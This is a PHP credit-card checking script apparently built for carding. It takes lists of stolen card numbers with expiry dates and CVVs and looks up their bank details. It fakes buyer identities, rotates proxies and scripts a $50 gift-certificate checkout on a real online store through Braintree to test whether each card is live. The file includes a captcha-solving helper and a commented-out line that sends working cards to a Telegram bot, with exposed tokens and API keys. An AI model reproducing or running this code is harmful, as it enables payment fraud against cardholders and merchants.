<?php
include(__DIR__."/Phppot/proxy.php");
error_reporting(0);
$time_start = microtime(true);
set_time_limit(200);
function GetStr($string, $start, $end){
    if ($string == ""){
        return false;

    }
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
$cookie = randomString();
function RandomString($length = 16)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}

function cURLc($url, $headers, $postfields, $customrequest) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => 1,
        // CURLOPT_SSL_VERIFYPEER => 1,
        // CURLOPT_SSL_VERIFYHOST => 1,
        // CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function proxy() 
{ 
$file = file("proxy.txt");
  $a = rand(0, sizeof($file) - 1); 
  $siteSelected  = $file[$a]; 
  return $siteSelected; 
}
function cURL($url, $headers, $postfields, $customrequest, $_fls, $cookie) {

    $ch = curl_init();
    curl_setopt_array($ch, array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_HEADER => 1,
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}


//port = rand(111,999);
 //$ips = proxy();
$ips = getProxy("best");
function cURL_ProxyOn($url, $headers, $postfields, $customrequest, $_fls, $cookie) {
   // $cookieys = file_get_contents(getcwd() . "/cookies/$cookie.txt");
    $ch = curl_init();
    curl_setopt_array($ch, array(
         CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => 1,
        CURLOPT_FOLLOWLOCATION => $_fls,
        // CURLOPT_RETURNTRANSFER => true,
        // CURLOPT_SSL_VERIFYPEER => false,
        // CURLOPT_PROXY => "proxy-server.zenscrape.com:8282",
       // CURLOPT_URL => "https://app.zenscrape.com/api/v1/get?apikey=dd19f2e0-5052-11ed-86e6-791429dd32d4&url=$url&render=true&premium=true&device_type=mobile&keep_headers=true",
        CURLOPT_PROXY => $ips,
        CURLOPT_HEADER => 1,
        CURLOPT_COOKIE => "itrack=$cookie",
        CURLOPT_CUSTOMREQUEST => $customrequest,
        CURLOPT_COOKIEFILE => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_COOKIEJAR => getcwd() . "/cookies/$cookie.txt",
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_POSTFIELDS => $postfields
    ));
    $response = curl_exec($ch);
    curl_close($ch);

    return $response;
}
function randomInfo(){

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL =>"https://namegenerator.in/assets/refresh.php?location=united-states",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
    //     CURLOPT_PROXY => "167.233.15.196:8282",
    // //  CURLOPT_PROXY => "$ips", 
    //     CURLOPT_PROXYUSERPWD => "191dd590-4d1e-11ed-9cb6-7d78857c1d6f:render=true&premium=true&location=de&device_type=mobile&keep_headers=true",
        CURLOPT_CUSTOMREQUEST => 'GET',
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}
extract($_GET);
$separator = explode("|", $lista);
$cc = $separator[0];
$ccbin = substr($cc, 0,6);
$mm = $separator[1];
$yy = $separator[2];
$yy1 = substr($yy, 2,2);
$cvv = $separator[3];

$cbin = substr($cc, 0,1);
$rnum = rand(1111,9999);


if($cbin == 5){
    $ctype = 'MasterCard';
}
else if($cbin == 4){
    $ctype = 'visa';
}

function solveCaptcha($site,$siteKey,$clientKey){
    $createTask =  cURLc(
        "https://api.capmonster.cloud/createTask",
        $headers = [
            "Content-Type: application/json",
            "accept: application/json"
        ],
        '{"clientKey":"'.$clientKey.'","task":{"type":"NoCaptchaTaskProxyless","websiteURL":"'.$site.'","websiteKey":"'.$siteKey.'"}}',
        "POST"
    );
    $taskId = getstr(json_encode($createTask,true),'"taskId\":','}');
    $status = "processing";
    $gResponse = "";
    while ($status == "processing") {
        sleep(3);
        $getTaskResult =  cURLc(
            "https://api.capmonster.cloud/getTaskResult ",
            $headers = [
                "Content-Type: application/json",
                "accept: application/json"
            ],
            '{"clientKey":"'.$clientKey.'","taskId": '.$taskId.'}',
            "POST"
        );
        $status = getstr($getTaskResult,'"status":"','"');
        $gResponse = getstr($getTaskResult,'"gRecaptchaResponse":"','"');}
    return $getTaskResult ;
}
$port = rand(10000, 11000);
$ch = curl_init();
curl_setopt_array($ch, array(
    CURLOPT_URL => "https://binov.net/",
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_FOLLOWLOCATION => 1,
    CURLOPT_HEADER => 1,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/x-www-form-urlencoded",
        "Referer: https://binov.net/",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36 Edg/101.0.1210.32"
    ],
    CURLOPT_POSTFIELDS => "BIN=$ccbin"
));
$g_ccdets = curl_exec($ch);
//$cc_bin = GetStr($g_ccdets, '</tr><tr><td>' , '</td>');
$cc_type0 = GetStr($g_ccdets, "$cc_bin</td><td>" , '</td>');
$cc_bname = GetStr($g_ccdets, "$cc_type0</td><td>" , '</td>');
$cc_type1 = GetStr($g_ccdets, "$cc_bname</td><td>" , '</td>');
$cc_type2 = GetStr($g_ccdets, "$cc_type1</td><td>" , '</td>');
$cc_country = GetStr($g_ccdets, "$cc_type2</td><td>" , '</td>');
// $CC_fDets = "BIN: $ccbin BIN Info: $type0-$type1-$type2 Bank: $cc_bname Country: $cc_country";
$CC_fDets = "Bank: $cc_bname Country: $cc_country";
$randomShits = randomInfo();
$data = json_decode($randomShits, true);
$fname = explode(" ", $data['name'])[0];
$lname = explode(" ", $data['name'])[1];
$email = $data['email']['address'];
$street = $data['street1'];
$local = GetStr($randomShits, '"street2":', ',"phone"');
$city = GetStr($local, '"', ',');
$state = GetStr($local, ', ', ' ');
$phone = str_replace("-", "", $data['phone']);
$postcode = GetStr($local, "$state" , '"');
#====================================

#============================================
//
//$trans_completed = false;
//$tries = 0;
//$limit = 3;
//$randomnum = rand(200000,300000);
//while ($trans_completed == false && $tries < $limit) {
// $tries = $tries + 1;
$trans_completed = false;
$limit = 10;
$tries = 0;

while ($trans_completed == false && $tries < $limit){
$tries = $tries + 1;

$cookie = RandomString();
$str = substr(randomString(), 0, 7);
$atc =  cURL(
    "https://rogiani.com/giftcertificates.php",
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    ],
    "",
    "GET",
    1,
    $cookie
); $authtoken = GetStr($atc, '"csrf_token":"', '"'); 
//  $authtoken2 = substr(GetStr($atc, '"csrf_token":"', '"'),0,34);
   $page =  cURL(
    "https://rogiani.com/giftcertificates.php?action=do_purchase",
    $headers = [
        'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'content-type: application/x-www-form-urlencoded',
        'origin: https://rogiani.com',
        'referer: https://rogiani.com/giftcertificates.php',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    ],
    "from_name=$str%2$str&from_email=$str%40gmail.com&to_name=$str%2$str&to_email=$str%40gmail.com&selected_amount=50&agree=on&agree2=on&message=&certificate_theme=General.html&authenticity_token=$authtoken",
    "POST",
    1,
    $cookie
);  
// $buttonkey = GetStr($page, "stripeButtonKey' value='", "'");
//  $create_pi = GetStr($page, '"asp_pp_ajax_create_pi_nonce":"', '"');

  $carts =  cURL(
    "https://rogiani.com/api/storefront/cart",
    $headers = [
        'accept: application/vnd.bc.v1+json',
        'referer: https://rogiani.com/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-api-internal: This API endpoint is for internal use only and may change in the future',
        'x-checkout-sdk-version: 1.299.0',
         'x-xsrf-token: '.$authtoken.', '.$authtoken,
    ],
    "",
    "GET",
    1,
    $cookie
);  $checkoutID = GetStr($carts, '"id":"', '"');

  $CHECKOUT =  cURL(
    "https://rogiani.com/checkout",
    $headers = [
        "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "referer: https://rogiani.com/cart.php",
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    ],
    "",
    "GET",
    1,
    $cookie
);   $variant = GetStr($CHECKOUT, "window.checkoutVariantIdentificationToken = '", "'"); 

//  $transID = $d["order_id"];
   $carts =  cURL(
    "https://rogiani.com/api/storefront/payments/braintreepaypal",
    $headers = [
        'accept: application/vnd.bc.v1+json',
        'referer: https://rogiani.com/cart.php',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-api-internal: This API endpoint is for internal use only and may change in the future',
        'x-checkout-sdk-version: 1.299.0',
         'x-xsrf-token: '.$authtoken.', '.$authtoken,
    ],
    "",
    "GET",
    1,
    $cookie
);  

 $gettoken =  cURL(
    "https://rogiani.com/api/storefront/checkout-settings?checkoutId=$checkoutID&include=cart.lineItems.physicalItems.categoryNames&include=cart.lineItems.digitalItems.categoryNames",
    $headers = [
        'accept: application/vnd.bc.v1+json',
        'referer: https://rogiani.com/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-api-internal: This API endpoint is for internal use only and may change in the future',
        'x-checkout-sdk-version: 1.299.0',
         'x-xsrf-token: '.$authtoken.', '.$authtoken,
    ],
    "",
    "GET",
    1,
    $cookie
); $data = GetStr($gettoken, '"token":"', '"');
 $data = json_decode(base64_decode($data), true);
  $fPrint = $data['authorizationFingerprint'];
$acc_token = $data['access_token'];

 $billings =  cURL_ProxyOn(
    "https://rogiani.com/api/storefront/checkouts/$checkoutID/billing-address?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Cpromotions.banners",
    $headers = [
        'accept: application/vnd.bc.v1+json',
        'referer: https://rogiani.com/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-api-internal: This API endpoint is for internal use only and may change in the future',
        'x-checkout-sdk-version: 1.299.0',
         'x-xsrf-token: '.$authtoken.', '.$authtoken,
    ],
    '{"email":"dasd23@gmail.com"}',
    "POST",
    1,
    $cookie
); $addressID = GetStr($billings, ' "id": "', '"');
 $address =  cURL_ProxyOn(
    "https://rogiani.com/api/storefront/checkouts/$checkoutID/billing-address/$addressID?include=cart.lineItems.physicalItems.options%2Ccart.lineItems.digitalItems.options%2Ccustomer%2Cpromotions.banners",
    $headers = [
        'accept: application/vnd.bc.v1+json',
        'referer: https://rogiani.com/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-api-internal: This API endpoint is for internal use only and may change in the future',
        'x-checkout-sdk-version: 1.299.0',
         'x-xsrf-token: '.$authtoken.', '.$authtoken,
    ],
    '{"countryCode":"US","firstName":"dsad asdsa","lastName":"assad","address1":"1227 Centrl Avenue","address2":"","company":"","city":"Los Angeles","stateOrProvince":"","postalCode":"90001","phone":"2162300850","shouldSaveAddress":true,"stateOrProvinceCode":"CA","customFields":[],"email":"dasd23@gmail.com"}',
    "POST",
    1,
    $cookie
); 
$order =  cURL_ProxyOn(
    "https://rogiani.com/internalapi/v1/checkout/order",
    $headers = [
        'accept: application/json, text/plain, */*',
        'content-type: application/json',
        'referer: https://rogiani.com/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-checkout-variant: '.$variant,
        'x-checkout-sdk-version: 1.299.0',
         'x-xsrf-token: '.$authtoken.', '.$authtoken.', '.$authtoken,
    ],
    '{"cartId":"'.$checkoutID.'","customerMessage":""}',
    "POST",
    1,
    $cookie
);  $sessionToken = GetStr($order, 'SHOP_SESSION_TOKEN=', ';');
$token = GetStr($order, '"token":"', '"');
 $JWT = GetStr($order, 'token: ', 'x-request-id');
  $JWT = substr($JWT,0,-1);
$orderid = GetStr($order,'"orderId":',',');
 $callback = GetStr($order,'"callbackUrl":"','"');
$ordercheckout =  cURL_ProxyOn(
    "https://rogiani.com/api/storefront/orders/$orderid?include=payments%2ClineItems.physicalItems.socialMedia%2ClineItems.physicalItems.options%2ClineItems.digitalItems.socialMedia%2ClineItems.digitalItems.opti",
    $headers = [
        'accept: application/vnd.bc.v1+json',
        'referer: https://rogiani.com/checkout',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
        'x-api-internal: This API endpoint is for internal use only and may change in the future',
        'x-checkout-sdk-version: 1.299.0',
         'x-xsrf-token: '.$authtoken.', '.$authtoken,
    ],
    '',
    "GET",
    1,
    $cookie
); 

  $graphl = cURL_ProxyOn(
    "https://payments.braintree-api.com/graphql",
    $headers = [
        "accept: */*",
        "Content-Type: application/json",
        "Authorization: Bearer $fPrint",
        "Host: payments.braintree-api.com",
        "Origin: https://assets.braintreegateway.com",
        "Referer: https://assets.braintreegateway.com/",
        "Braintree-Version: 2018-05-10",
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.47"
    ],
    '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e7fb6475-8144-4218-b0b9-d2a52a18437a"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mm.'","expirationYear":"'.$yy.'","cvv":"'.$cvv.'","cardholderName":"'.$fname.' '.$lname.'","billingAddress":{"countryName":"United States","postalCode":"'.$postcode.'","streetAddress":"'.$street.'"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}',
    "POST",
    1,
    $cookie
);
 $payment_token = GetStr($graphl, '"token":"', '"');

 
  $execute =  cURL_ProxyOn(
    "https://payments.bigcommerce.com/api/public/v1/orders/payments",
    $headers = [
        'Accept: application/json',
        'Content-Type: application/json',
        'Authorization: '.$JWT,
        'Host: payments.bigcommerce.com',
        'Referer: https://rogiani.com/',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
    ],
    '{"customer":{"customer_group":{"name":"  Retail"},"geo_ip_country_code":"US","session_token":"'.$str.'"},"notify_url":"'.$callback.'","order":{"billing_address":{"city":"Los Angeles","country_code":"US","country":"United States","first_name":"'.$str.' '.$str.'","last_name":"'.$str.'","phone":"2162300850","state_code":"CA","state":"California","street_1":"'.$str.'","zip":"90001","email":"'.$str.'@gmail.com"},"coupons":[],"currency":"USD","id":"'.$orderid.'","items":[{"code":"'.$str.'","name":"$50.00 Gift Certificate","price":5000,"unit_price":5000,"quantity":1}],"shipping":[],"shipping_address":{},"token":"'.$token.'","totals":{"grand_total":5000,"handling":0,"shipping":0,"subtotal":5000,"tax":0}},"payment":{"device_info":"","gateway":"braintree","notify_url":"'.$callback.'","vault_payment_instrument":false,"method":"credit-card","credit_card_token":{"token":"'.$payment_token.'"}},"store":{"hash":"21357","id":"204629","name":"Rogiani Inc"}}',
    "POST",
    1,
    $cookie
); $http_status = curl_getinfo($execute, CURLINFO_HTTP_CODE);
$response = GetStr($execute, '"message":"','"');$dcode = GetStr($execute, '"code":"','"');

//     $response = GetStr($ajax_confirm, 'System was not able to complete the payment.','.');
// }else{
//     $response = GetStr($token_method, '"message": "','"');
// }
if (strpos($execute, 'Unauthorized')){
    $trans_completed = false;
}else{
    $trans_completed = true;
}
}

if (strpos($execute, '"status":"success"')){
    echo '<tr><td><span class="badge bg-success">LIVE CCN</span></td><td><span> => </span></td><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td> <td><span class="badge badge-success badge-pill">Authorise </span> <span class="badge bg-light text-dark">'.$CC_fDets.'</span></td></tr><br>';
  //  file_get_contents('https://api.telegram.org/bot1405110178:AAFo20MsFbsCxH5tjWoPFKHsOVRgbdUwJWU/sendMessage?chat_id=1087333523&text='.$lista.' Authorise CCN - STRPE GATE');
}elseif (strpos($execute, '"status":"error"')){
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill"> "MESSAGE": "'.$response.'"('.$dcode.') - Retries: '.$retries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}else {
    echo '<tr><td><span class="badge badge-dark badge-pill">'.$lista.'</span></td><td><span> => </span></td><td><span class="badge badge-danger badge-pill">"MESSAGE": MERCHANT DEAD - Retries: '.$tries.'</span></td><td><span class="badge badge-info badge-pill"> INFO: '.$ips.' Took '.number_format(microtime(true) - $time_start, 2).' seconds</span></td></tr><br>';
}


unlink("cookies/$cookie.txt");

?>